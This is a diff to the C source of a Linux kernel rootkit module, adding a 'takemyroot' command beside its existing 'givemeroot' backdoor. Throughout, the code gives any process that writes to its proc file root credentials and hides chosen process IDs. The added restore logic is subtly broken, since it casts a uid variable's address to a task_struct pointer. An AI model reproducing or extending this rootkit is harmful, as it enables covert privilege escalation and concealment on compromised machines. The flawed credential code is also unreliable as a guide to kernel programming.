@@ -11,6 +11,7 @@
 #define MAX_PIDS 50
 
 char name[] = "";
+kuid_t orig_uid;
 
 //static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -86,6 +87,7 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
         sprintf(module_status,
             "CMDS: \n\
         -> givemeroot  - uid and gid 0 for writing process \n\
+        -> takemyroot  - uid and gid back to original state \n\
         ->------------------------------------------------- \n\
         -> nhprocXXXXX - proc id to be norm hidden \n\
         -> dhprocXXXXX - proc id to be deep hidden \n\
@@ -109,7 +111,12 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
 {
     if(!strncmp(buffer, "givemeroot", MIN(10, count)))
     {
+        orig_uid = current_uid();
         return commit_creds(prepare_kernel_cred(0));
+    }
+    else if(!strncmp(buffer, "takemyroot", MIN(10, count)))
+    {
+        return commit_creds(prepare_kernel_cred((struct task_struct*)&orig_uid));
     }
     else if(!strncmp(buffer, "nhproc", MIN(6, count)))
     {
@@ -250,6 +257,7 @@ static int __init procfs_init(void)
     sprintf(module_status,
         "CMDS: \n\
     -> givemeroot  - uid and gid 0 for writing process \n\
+    -> takemyroot  - uid and gid back to original state \n\
     ->------------------------------------------------- \n\
     -> nhprocXXXXX - proc id to be norm hidden \n\
     -> dhprocXXXXX - proc id to be deep hidden \n\
